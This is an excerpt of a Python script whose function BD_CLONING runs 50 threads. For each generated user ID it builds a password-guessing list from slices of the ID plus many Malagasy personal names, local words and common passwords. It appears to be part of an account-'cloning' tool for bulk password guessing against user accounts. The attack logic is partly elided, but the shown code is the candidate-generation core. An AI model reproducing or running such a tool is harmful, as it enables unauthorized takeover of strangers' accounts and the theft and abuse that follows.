...
def BD_CLONING():
    ...
    with tred(max_workers=50) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','rak roots','Rakoto','rakoto','Rak roots','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa','mampionona','Mampionona','nomena', 'nomena','Nomena','mamolava','vololona','Vololona','mahaleo','Mahaleo','joselain','Joselain','jehovah','Jehovah','richard','Richard','vadikely','Vadikely','mamakely','Mamakely','dadakely','Dadakely','Andry','andry123','andry','michel','Michel','fanantenana','Fanantenana','matory','Matory','lelena','Lelena','ranoray','makorely','ragasy','Ragasy','solofo','Solofo','123456','michael','football','superman','batman','dragon','12345','monkey','basketball','finaritra','Finaritra','mamanay','Mamanay','dadanay','Dadanay','zanako','Zanako','sarobidy','Sarobidy','malaso','Malaso','dahalo','Dahalo','valisoa','Valisoa','narindra','Narindra','daniela','Daniela','chérie','Chérie','milely','Milely','madagasikara','Madagasikara','paris','Paris','sarah','Sarah','fabien','Fabien','farao','Farao','Frédéric','frédéric','volatiana','Volatiana','massage','Massage','porno','Porno','password','Password','mivady','Mivady','fanomezana','Fanomezana','martine','Martine','nirina','Nirina','radonirina','erik manana','deliance','Deliance','dokotera','Dokotera','Aina','aina','rasoa','Rasoa','Tiavina','tiavina','zazakely','Zazakely','sarindra','Sarindra','nandrianina','Nandrianina']
